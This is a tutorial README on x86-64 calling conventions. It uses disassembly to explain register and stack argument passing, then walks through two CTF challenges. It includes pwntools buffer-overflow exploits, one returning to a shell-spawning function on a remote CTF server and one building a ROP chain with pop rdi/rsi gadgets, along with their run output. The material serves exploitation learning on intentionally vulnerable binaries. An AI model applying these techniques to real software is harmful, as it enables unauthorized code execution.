# Calling Conventions

This repository focuses on the study of calling conventions on 64-bit architectures. These conventions define the rules for passing parameters to functions and managing call stacks. Understanding these conventions is fundamental for those who wish to delve into reverse engineering and/or vulnerability exploitation in low-level systems. This repository is intended to facilitate the learning of these concepts.

We will start by compiling and analyzing the following code.

```c
#include <stdio.h>

void vuln(int check, int check2, int check3) {
    if(check == 0xdeadbeef && check2 == 0xdeadc0de && check3 == 0xc0ded00d) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d);
    vuln(0xdeadc0de, 0x12345678, 0xabcdef10);
}
```

The `vuln` function contains a condition that checks whether the three input parameters match the expected values: `0xdeadbeef`, `0xdeadc0de` and `0xc0ded00d`. If the condition is met, it prints `Nice!` on the standard output; otherwise, it displays `Not nice!`. The `main` function invokes vuln twice: the first time with the correct parameters and the second time with unexpected values.

To compile this code, we will use the following flags:

```shell
$ gcc source.c -o vuln-64 -no-pie -fno-stack-protector
```

When we run the binary, we get the expected results:

```shell
$ ./vuln-64
Nice!
Not nice!
```

We will use `radare2` to disassemble the `main` function and observe how the `vuln` calls are made.

```asm
            ; DATA XREF from entry0 @ 0x40105d
┌ 51: int main (int argc, char **argv, char **envp);
│           0x0040116c      55             push rbp
│           0x0040116d      4889e5         mov rbp, rsp
│           0x00401170      ba0dd0dec0     mov edx, 0xc0ded00d
│           0x00401175      bedec0adde     mov esi, 0xdeadc0de
│           0x0040117a      bfefbeadde     mov edi, 0xdeadbeef
│           0x0040117f      e89effffff     call sym.vuln
│           0x00401184      ba10efcdab     mov edx, 0xabcdef10
│           0x00401189      be78563412     mov esi, 0x12345678         ; 'xV4\x12'
│           0x0040118e      bfdec0adde     mov edi, 0xdeadc0de
│           0x00401193      e88affffff     call sym.vuln
│           0x00401198      b800000000     mov eax, 0
│           0x0040119d      5d             pop rbp
└           0x0040119e      c3             ret
```

In the above disassembly we see that the values `0xdeadbeef`, `0xdeadc0de` and `0xc0ded00d` are passed to the registers `edi`, `esi`, `edx` using the `mov` instruction, this instruction is used to load the values to be passed as arguments to the `vuln` function. The registers used are `rdi`, `rsi` and `rdx`, which are the 64-bit registers designated to receive the parameters in the x86-64 calling convention, this is the order.

```
- rdi: First argument
- rsi: Second argument
- rdx: Third argument
- rcx: Fourth argument
- r8: Fifth argument
- r9: Sixth argument
```

> It is crucial to note that the values moved to these registers are represented in 32 bits, which is indicated by the use of `e` prefixes (`edx`, `esi`, `edi`). This reflects how data of different sizes is handled in the context of program memory.

You might say “Mmmm okay... it's understood so far” but what if I put more arguments? For that I programmed the following code.

```c
//gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
//gcc source.c -o vuln-64 -no-pie -fno-stack-protector

#include <stdio.h>

void vuln(int check, int check2, int check3, int check4, int check5, int check6, int check7, int check8) {
    if(check == 0xdeadbeef && check2 == 0xdeadc0de && check3 == 0xc0ded00d && check4 == 0x0badf00d && check5 == 0xfee1dead && check6 == 0xfeedface && check7 == 0x8badf00d && check8 == 0xdecafbad) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d, 0x0badf00d, 0xfee1dead, 0xfeedface, 0x8badf00d, 0xdecafbad);
    vuln(0xdeadc0de, 0x12345678, 0xabcdef10, 0xfaceb00c, 0xdeadf00d, 0xfacefeed, 0x8badf00d, 0x1c0de);
}
```

Very similar to the first one but with more arguments (it compiles using the same flags). In the first call to `vuln` are the correct parameters, and in the second the incorrect ones. Using `radare2` we will see the disassembly of the `main` function. 

```asm
            ; DATA XREF from entry0 @ 0x401068
┌ 117: int main (int argc, char **argv, char **envp);
│           0x004011c2      f30f1efa       endbr64
│           0x004011c6      55             push rbp
│           0x004011c7      4889e5         mov rbp, rsp
│           0x004011ca      68adfbcade     push 0xffffffffdecafbad
│           0x004011cf      680df0ad8b     push 0xffffffff8badf00d
│           0x004011d4      41b9cefaedfe   mov r9d, 0xfeedface
│           0x004011da      41b8addee1fe   mov r8d, 0xfee1dead
│           0x004011e0      b90df0ad0b     mov ecx, 0xbadf00d
│           0x004011e5      ba0dd0dec0     mov edx, 0xc0ded00d
│           0x004011ea      bedec0adde     mov esi, 0xdeadc0de
│           0x004011ef      bfefbeadde     mov edi, 0xdeadbeef
│           0x004011f4      e83dffffff     call sym.vuln
│           0x004011f9      4883c410       add rsp, 0x10
│           0x004011fd      68dec00100     push 0x1c0de
│           0x00401202      680df0ad8b     push 0xffffffff8badf00d
│           0x00401207      41b9edfecefa   mov r9d, 0xfacefeed
│           0x0040120d      41b80df0adde   mov r8d, 0xdeadf00d
│           0x00401213      b90cb0cefa     mov ecx, 0xfaceb00c
│           0x00401218      ba10efcdab     mov edx, 0xabcdef10
│           0x0040121d      be78563412     mov esi, 0x12345678         ; 'xV4\x12'
│           0x00401222      bfdec0adde     mov edi, 0xdeadc0de
│           0x00401227      e80affffff     call sym.vuln
│           0x0040122c      4883c410       add rsp, 0x10
│           0x00401230      b800000000     mov eax, 0
│           0x00401235      c9             leave
└           0x00401236      c3             ret
```

We see that when it has no more arguments it uses the `push` instruction. This instruction is essential when you need to pass more arguments than can be handled by the registers available in the calling convention. As we know in x86-64, the first six arguments are passed through the registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`). However, if you need to pass more arguments or if some of the values are larger than what a 32-bit register can hold, you can use push to place them on the stack. I hope that with the two examples above it is clear to you at a theoretical level how the calling conventions work.

## Practice with challenges

For practice we will solve the `Params` challenge from [ForeverCTF](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) and finally the `exploiting-with-params` from [ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) notes. These challenges have to do with calling conventions, so they will come in handy to practice what we have learned recently.

### Params

We are provided with a binary called `params` with the following protections.

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The binary has Partial RELRO and NX enabled, which means that no data can be executed on the stack, although the symbol table overwrite protection is partial. All other protections are disabled. If we execute the binary we are asked for our name and we can tell it which memory address each register will point to.

```shell
$ ./params
hey bb
whats ur name
test
hey test
you can set my registers any day of the week
rax: 1
rbx: 1
rcx: 1
rdx: 1
rsi: 1
rdi: 1
```

With Ghidra we can see the main function of the binary.

```c
undefined  [16] main(void)

{
  undefined auVar1 [16];
  undefined8 local_78;
  undefined8 local_70;
  ulong local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  char local_48 [64];
  
  puts("hey bb");
  puts("whats ur name");
  gets(local_48);
  printf("hey %s\n",local_48);
  puts("you can set my registers any day of the week");
  local_50 = 0;
  local_58 = 0;
  local_60 = 0;
  local_68 = 0;
  local_70 = 0;
  local_78 = 0;
  printf("rax: ");
  FUN_004010c0(&DAT_0040205b,&local_50);
  printf("rbx: ");
  FUN_004010c0(&DAT_0040205b,&local_58);
  printf("rcx: ");
  FUN_004010c0(&DAT_0040205b,&local_60);
  printf("rdx: ");
  FUN_004010c0(&DAT_0040205b,&local_68);
  printf("rsi: ");
  FUN_004010c0(&DAT_0040205b,&local_70);
  printf("rdi: ");
  FUN_004010c0(&DAT_0040205b,&local_78);
  auVar1._8_8_ = 0;
  auVar1._0_8_ = local_68;
  return auVar1 << 0x40;
}
```

It defines a 64-bit buffer and takes our input using `gets`, we have a *Buffer Overflow* since the `gets` function does not control the number of bytes we enter. Then it defines 6 variables with a value of 0 and makes us indicate the value that will have each register. If we continue analyzing the Symbol Tree we will see a function `get_flag` with the following content.

```c
void get_flag(long param_1,long param_2,long param_3,long param_4)

{
  char *local_18;
  undefined8 local_10;
  
  if ((((param_1 == 0x1337) && (param_2 == 0xcafebabe)) && (param_3 == 0xdeadbeef)) &&
     (param_4 == 4)) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  return;
}
```

This function verifies by means of a conditional that the first four parameters are equal to `0x1337`, `0xcafebabe` , `0xdeadbeef` and `4`, if the condition is fulfilled it returns a reverse shell. To solve this challenge we must exploit a *Buffer Overflow* to jump to the `get_flag` function, after that we must indicate the parameters that it waits for the shell to return us, we can do this indicating the value of the addresses of when we executed the binary.

When recoding the calling conventions, we must assign to the registers the following values: to the register `rdi` corresponds the address `0x1337`, to `rsi` is assigned the address `0xcafebabe`, to `rdx` is given the address `0xdeadbeef`, and to `rcx` is passed the value `4`. With the following exploit we solve the challenge.

```python
from pwn import *

p = remote('forever.isss.io', 1304)

payload = b'A' * 64
payload += p64(0x000000000040101a)      # stack alignment 16 bytes ubuntu
payload += p64(0x401354)                # get_flag() address
p.sendline(payload)


p.sendline(b'0')
p.sendline(b'0')
p.sendline(b'4')
p.sendline(str(0xdeadbeef))
p.sendline(str(0xcafebabe))
p.sendline(str(0x1337))

p.interactive()
```

By executing it we can solve the challenge.

```shell
$ python3 solve.py
[+] Opening connection to forever.isss.io on port 1304: Done
[*] Switching to interactive mode
hey bb
whats ur name
hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@
you can set my registers any day of the week
rax: $ id
uid=1000(params) gid=1000(params) groups=1000(params)
$ ls
flag.txt
$ cat flag.txt
utflag{u_got_my_params!235407F7}
```

### exploiting_with_params Ir0nstone

We are provided with a binary with the following protections.

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

It has the same protections as the previous binary, the only difference is that here it is not necessary to do reversing since they give us their source code.

```c
//gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
//gcc source.c -o vuln-64 -no-pie -fno-stack-protector

#include <stdio.h>

void vuln() {
    char buffer[40];
    puts("Overflow Me");
    gets(buffer);
}

int main() {
    vuln();
}

void flag(int check, int check2) {
    if(check == 0xdeadc0de && check2 == 0xc0ded00d) {
        puts("Got it!");
    }
}
```

We see that in the function `main` calls the function `vuln`, in this function is defined a buffer of 40 bytes and takes our input using `gets`, here again we have a *Buffer Overflow* because as we know, `gets` does not validate the length of the input entered by us, then we can overflow the buffer. Further down it defines a function `flag` that waits for the parameters `0xdeadc0de` and `0xc0ded00d` to return us a `Got it!`, indicating us that we solved the challenge.

To solve this challenge we must exploit the *Buffer Overflow*, jump to the flag function, use a `pop rdi; ret` gadget to assign the value `0xdeadc0de` and a `pop rsi; ret` gadget to assign the value `0xc0ded00d` and solve the challenge, to find the gadgets we will use `ROPgadget`.

```shell
$ ROPgadget --binary vuln-64 | grep "rdi"
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x00000000004010a6 : or dword ptr [rdi + 0x404038], edi ; jmp rax
0x00000000004011fb : pop rdi ; ret

$ ROPgadget --binary vuln-64 | grep "rsi"
0x00000000004011f9 : pop rsi ; pop r15 ; ret
```

Once we have this we have what we need to write our solution script, with the following we can solve the challenge.

```python3
from pwn import *

p = process('./vuln-64')

POP_RDI = 0x00000000004011fb    
POP_RSI = 0x00000000004011f9

payload = b'A' * 56                 # offset
payload += p64(POP_RDI)             # pop rdi ; ret
payload += p64(0xdeadc0de)          # check one
payload += p64(POP_RSI)
payload += p64(0xc0ded00d)          # check two
payload += p64(0x90)
payload += p64(0x0040116f)          # flag() function

p.sendline(payload)
p.interactive()
```

We see that I define the two gadgets, then I exploit the Buffer Overflow (the offset was 56 bytes), I pass the `POP_RDI` gadget to assign the `0xdeadc0de` value to the register `rdi`, then I pass the `POP_RSI` gadget to assign the `0xc0ded00d` value to the register `rsi`, finally I pass a `0x90` (NOP) for the `pop r15` value of the `POP_RSI` gadget and finally I call the `flag()` function, by executing the script we solve the challenge.

```shell
$ python3 solve.py
[+] Starting local process './vuln-64': pid 22245
[*] Switching to interactive mode
Overflow Me
Got it!
```
